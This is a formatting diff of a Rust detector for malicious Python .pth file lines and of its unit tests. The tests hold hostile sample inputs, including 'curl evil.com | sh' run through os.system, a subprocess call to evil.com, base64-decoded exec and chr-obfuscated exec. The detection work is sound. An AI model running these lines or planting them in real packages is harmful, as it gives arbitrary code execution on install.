@@ -239,8 +239,8 @@ pub fn analyse_pth_line(line: &str) -> PthVerdict {
 
     // Also check for Unicode homoglyph evasion in "import"
     let has_non_ascii = trimmed.bytes().any(|b| !b.is_ascii());
-    let looks_like_import = has_non_ascii
-        && (lower.contains("mport") || lower.contains("\u{0456}mport"));
+    let looks_like_import =
+        has_non_ascii && (lower.contains("mport") || lower.contains("\u{0456}mport"));
 
     if has_import || looks_like_import {
         return PthVerdict {
@@ -426,8 +426,7 @@ mod tests {
 
     #[test]
     fn benign_path_with_hyphens_and_dots() {
-        let result =
-            analyse_pth_line("/usr/lib/python3.12/dist-packages/my-package.2.0");
+        let result = analyse_pth_line("/usr/lib/python3.12/dist-packages/my-package.2.0");
         assert_eq!(result.level(), ThreatLevel::Info);
     }
 
@@ -437,9 +436,8 @@ mod tests {
 
     #[test]
     fn warning_simple_import() {
-        let result = analyse_pth_line(
-            "import pkg_resources; pkg_resources.fixup_namespace_packages('')",
-        );
+        let result =
+            analyse_pth_line("import pkg_resources; pkg_resources.fixup_namespace_packages('')");
         assert!(result.level() >= ThreatLevel::Warning);
     }
 
@@ -461,9 +459,7 @@ mod tests {
 
     #[test]
     fn critical_base64_exec_pattern() {
-        let result = analyse_pth_line(
-            r#"import base64;exec(base64.b64decode("aW1wb3J0IG9z..."))"#,
-        );
+        let result = analyse_pth_line(r#"import base64;exec(base64.b64decode("aW1wb3J0IG9z..."))"#);
         assert_eq!(result.level(), ThreatLevel::Critical);
         assert!(result.reasons().iter().any(|r| r.contains("base64")));
         assert!(result.reasons().iter().any(|r| r.contains("exec")));
@@ -471,47 +467,39 @@ mod tests {
 
     #[test]
     fn critical_eval_pattern() {
-        let result =
-            analyse_pth_line(r"import os; eval(os.environ.get('PAYLOAD'))");
+        let result = analyse_pth_line(r"import os; eval(os.environ.get('PAYLOAD'))");
         assert_eq!(result.level(), ThreatLevel::Critical);
     }
 
     #[test]
     fn critical_subprocess_pattern() {
-        let result = analyse_pth_line(
-            "import subprocess; subprocess.Popen(['curl', 'evil.com'])",
-        );
+        let result = analyse_pth_line("import subprocess; subprocess.Popen(['curl', 'evil.com'])");
         assert_eq!(result.level(), ThreatLevel::Critical);
     }
 
     #[test]
     fn critical_dunder_import_pattern() {
-        let result =
-            analyse_pth_line("__import__('os').system('curl evil.com | sh')");
+        let result = analyse_pth_line("__import__('os').system('curl evil.com | sh')");
         assert_eq!(result.level(), ThreatLevel::Critical);
     }
 
     #[test]
     fn critical_compile_exec_pattern() {
-        let result = analyse_pth_line(
-            "exec(compile(open('/tmp/payload.py').read(), '<string>', 'exec'))",
-        );
+        let result =
+            analyse_pth_line("exec(compile(open('/tmp/payload.py').read(), '<string>', 'exec'))");
         assert_eq!(result.level(), ThreatLevel::Critical);
     }
 
     #[test]
     fn critical_obfuscated_with_chr_concat() {
-        let result = analyse_pth_line(
-            "exec(''.join([chr(105),chr(109),chr(112),chr(111)]))",
-        );
+        let result = analyse_pth_line("exec(''.join([chr(105),chr(109),chr(112),chr(111)]))");
         assert_eq!(result.level(), ThreatLevel::Critical);
     }
 
     #[test]
     fn critical_multiline_semicolon_chain() {
-        let result = analyse_pth_line(
-            "import os;import base64;exec(base64.b64decode(os.environ['P']))",
-        );
+        let result =
+            analyse_pth_line("import os;import base64;exec(base64.b64decode(os.environ['P']))");
         assert_eq!(result.level(), ThreatLevel::Critical);
     }
 
@@ -528,8 +516,7 @@ mod tests {
 
     #[test]
     fn evasion_null_bytes() {
-        let result =
-            analyse_pth_line("import\x00 base64;exec(base64.b64decode('..'))");
+        let result = analyse_pth_line("import\x00 base64;exec(base64.b64decode('..'))");
         assert_eq!(result.level(), ThreatLevel::Critical);
     }
 
@@ -611,11 +598,7 @@ mod tests {
     #[test]
     fn unknown_package_falls_through_to_analysis() {
         let content = "import base64;exec(base64.b64decode('...'))";
-        let result = analyse_pth_file_with_context(
-            content,
-            "evil-package",
-            "sha256:malicious",
-        );
+        let result = analyse_pth_file_with_context(content, "evil-package", "sha256:malicious");
         assert_eq!(result.verdict, FileVerdict::Critical);
     }
 
@@ -631,12 +614,8 @@ mod tests {
         let hash = super::content_hash(content.as_bytes());
 
         // Without custom allowlist, this would be Warning (has import)
-        let result_without = analyse_pth_file_with_custom_allowlist(
-            content,
-            "my-internal",
-            &hash,
-            None,
-        );
+        let result_without =
+            analyse_pth_file_with_custom_allowlist(content, "my-internal", &hash, None);
         assert_eq!(result_without.verdict, FileVerdict::Warning);
 
         // With a custom allowlist containing this package+hash, it should be allowlisted
@@ -644,12 +623,8 @@ mod tests {
             package: "my-internal".to_string(),
             hash: hash.clone(),
         }];
-        let result_with = analyse_pth_file_with_custom_allowlist(
-            content,
-            "my-internal",
-            &hash,
-            Some(&custom),
-        );
+        let result_with =
+            analyse_pth_file_with_custom_allowlist(content, "my-internal", &hash, Some(&custom));
         assert_eq!(result_with.verdict, FileVerdict::AllowlistedKnownPackage);
     }
 
@@ -664,12 +639,8 @@ mod tests {
             package: "suspicious".to_string(),
             hash: "sha256:wrong_hash".to_string(),
         }];
-        let result = analyse_pth_file_with_custom_allowlist(
-            content,
-            "suspicious",
-            &hash,
-            Some(&custom),
-        );
+        let result =
+            analyse_pth_file_with_custom_allowlist(content, "suspicious", &hash, Some(&custom));
         // Hash doesn't match, should fall through to analysis
         assert_eq!(result.verdict, FileVerdict::Warning);
     }
